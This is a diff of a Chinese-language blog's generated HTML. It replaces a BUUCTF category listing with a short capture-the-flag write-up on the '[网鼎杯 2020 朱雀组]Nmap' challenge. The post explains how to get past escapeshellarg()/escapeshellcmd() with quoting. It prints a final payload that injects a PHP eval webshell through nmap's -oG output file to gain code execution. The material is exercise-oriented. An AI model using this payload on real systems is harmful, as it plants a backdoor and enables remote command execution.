@@ -19,25 +19,33 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="welcome to my blog (*^_^*)">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Z1d10t&#39;s Blog">
-<meta property="og:url" content="http://example.com/categories/buuctf/page/3/index.html">
+    <meta name="description" content="看题目是一道关于nmap的题目 试试127.0.0.1  再来试试我本地kali的nmap  几乎是一样的 估计就只是放了个接口  nmap 命令可以将扫描结果保存在文件里面  就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护  与之前做的有道题目很相似 可以用空格与单引号绕过 选项：  最终payload： 1&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buuctf-52-[网鼎杯 2020 朱雀组]Nmap">
+<meta property="og:url" content="http://example.com/post/c93f1585.html">
 <meta property="og:site_name" content="Z1d10t&#39;s Blog">
-<meta property="og:description" content="welcome to my blog (*^_^*)">
+<meta property="og:description" content="看题目是一道关于nmap的题目 试试127.0.0.1  再来试试我本地kali的nmap  几乎是一样的 估计就只是放了个接口  nmap 命令可以将扫描结果保存在文件里面  就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护  与之前做的有道题目很相似 可以用空格与单引号绕过 选项：  最终payload： 1&amp;#x2">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png">
+<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png">
+<meta property="article:published_time" content="2023-05-01T06:53:11.000Z">
+<meta property="article:modified_time" content="2023-05-01T07:16:52.573Z">
 <meta property="article:author" content="Z1d10t">
+<meta property="article:tag" content="nmap">
+<meta property="article:tag" content="esc***函数">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png">
 
 
-<link rel="canonical" href="http://example.com/categories/buuctf/page/3/">
+<link rel="canonical" href="http://example.com/post/c93f1585.html">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"categories/buuctf/page/3/index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/post/c93f1585.html","path":"post/c93f1585.html","title":"buuctf-52-[网鼎杯 2020 朱雀组]Nmap"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>分类: buuctf | Z1d10t's Blog</title>
+<title>buuctf-52-[网鼎杯 2020 朱雀组]Nmap | Z1d10t's Blog</title>
   
 
 
@@ -182,233 +190,123 @@
 
     </div>
 
-    <div class="main-inner category posts-collapse">
+    <div class="main-inner post posts-expand">
 
 
   
+
+
+<div class="post-block">
   
   
-  <div class="post-block">
-    <div class="post-content">
-      <div class="collection-title">
-        <h1 class="collection-header">buuctf
-          <small>分类</small>
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/c93f1585.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10t's Blog">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="buuctf-52-[网鼎杯 2020 朱雀组]Nmap | Z1d10t's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          buuctf-52-[网鼎杯 2020 朱雀组]Nmap
         </h1>
-      </div>
 
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
       
-    <div class="collection-year">
-      <span class="collection-header">2023</span>
+
+      <time title="创建时间：2023-05-01 14:53:11 / 修改时间：15:16:52" itemprop="dateCreated datePublished" datetime="2023-05-01T14:53:11+08:00">2023-05-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/buuctf/" itemprop="url" rel="index"><span itemprop="name">buuctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>看题目是一道关于nmap的题目</p>
+<p>试试127.0.0.1</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923110212-7b3277b4-e3a8-4ddc-a6d3-2029a20ecad2.png" alt="img"></p>
+<p>再来试试我本地kali的nmap</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923143566-65b6630b-bc38-4280-a492-155645429f5a.png" alt="img"></p>
+<p>几乎是一样的 估计就只是放了个接口</p>
+<p> nmap 命令可以将扫描结果保存在文件里面 </p>
+<p>就可以想到写一句话木马 这里屏蔽了php 并且 escapeshellarg()与escapeshellcmd()函数处理保护  与之前做的有道题目很相似</p>
+<p>可以用空格与单引号绕过</p>
+<p>选项：</p>
+<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682923628955-36f85d37-609e-4bee-b23f-63ef33cd4b38.png" alt="img"></p>
+<p>最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?= @eval($_POST[1]);?&gt; -oG a.phtml &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>之后rce就行了</p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-27T12:58:13+08:00"
-              content="2023-02-27">
-          02-27
-        </time>
-      </div>
+    
+    
+    
 
-      <div class="post-title">
-          <a class="post-title-link" href="/post/9efd4054.html" itemprop="url">
-            <span itemprop="name">buuctf 36-[BUUCTF 2018]Online Tool</span>
-          </a>
-      </div>
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/nmap/" rel="tag"># nmap</a>
+              <a href="/tags/esc-%E5%87%BD%E6%95%B0/" rel="tag"># esc***函数</a>
+          </div>
 
-      
-    </header>
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/post/db3afe26.html" rel="prev" title="buuctf-96-[GYCTF2020]EasyThinking">
+                  <i class="fa fa-chevron-left"></i> buuctf-96-[GYCTF2020]EasyThinking
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
   </article>
+</div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-27T12:53:24+08:00"
-              content="2023-02-27">
-          02-27
-        </time>
-      </div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/post/a4341e77.html" itemprop="url">
-            <span itemprop="name">buuctf 35-[BJDCTF2020]The mystery of ip</span>
-          </a>
-      </div>
 
-      
-    </header>
-  </article>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-26T23:34:24+08:00"
-              content="2023-02-26">
-          02-26
-        </time>
-      </div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/post/d05894c4.html" itemprop="url">
-            <span itemprop="name">buuctf 34-[RoarCTF 2019]Easy Java</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-19T20:43:59+08:00"
-              content="2023-02-19">
-          02-19
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/c6fe9d66.html" itemprop="url">
-            <span itemprop="name">buuctf 33-[网鼎杯 2018]Fakebook</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-19T20:39:47+08:00"
-              content="2023-02-19">
-          02-19
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/3b320c12.html" itemprop="url">
-            <span itemprop="name">buuctf 32-[CISCN2019 华北赛区 Day2 Web1]Hack World</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-17T23:12:07+08:00"
-              content="2023-02-17">
-          02-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/a8bde72c.html" itemprop="url">
-            <span itemprop="name">buuctf 31-[GYCTF2020]Blacklist</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-17T21:50:32+08:00"
-              content="2023-02-17">
-          02-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/b32b8b53.html" itemprop="url">
-            <span itemprop="name">buuctf 29-[GXYCTF2019]BabySQli</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-17T21:46:26+08:00"
-              content="2023-02-17">
-          02-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/58b11103.html" itemprop="url">
-            <span itemprop="name">buuctf 25-[极客大挑战 2019]HardSQL</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-17T21:34:46+08:00"
-              content="2023-02-17">
-          02-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/b64980cf.html" itemprop="url">
-            <span itemprop="name">buuctf 22-admin</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2023-02-17T21:27:27+08:00"
-              content="2023-02-17">
-          02-17
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/post/eef45ee2.html" itemprop="url">
-            <span itemprop="name">buuctf 21-[BJDCTF2020]Easy MD5</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-    </div>
-  </div>
-  
-  
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/categories/buuctf/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/categories/buuctf/">1</a><a class="page-number" href="/categories/buuctf/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/categories/buuctf/page/4/">4</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/categories/buuctf/page/4/"><i class="fa fa-angle-right"></i></a>
-  </nav>
 
 </div>
   </main>
